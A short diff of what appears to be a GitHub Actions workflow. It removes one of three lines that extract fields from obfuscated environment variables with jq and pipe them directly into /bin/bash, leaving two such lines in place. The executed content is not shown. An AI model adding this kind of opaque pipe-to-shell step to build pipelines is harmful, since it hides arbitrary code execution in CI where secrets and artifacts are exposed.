@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$belks4555" | jq -r .ygq65782 | /bin/bash
           echo $ldt3 | jq -r .q98 | /bin/bash
-          echo $fad231 | jq -r .cfd0023 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
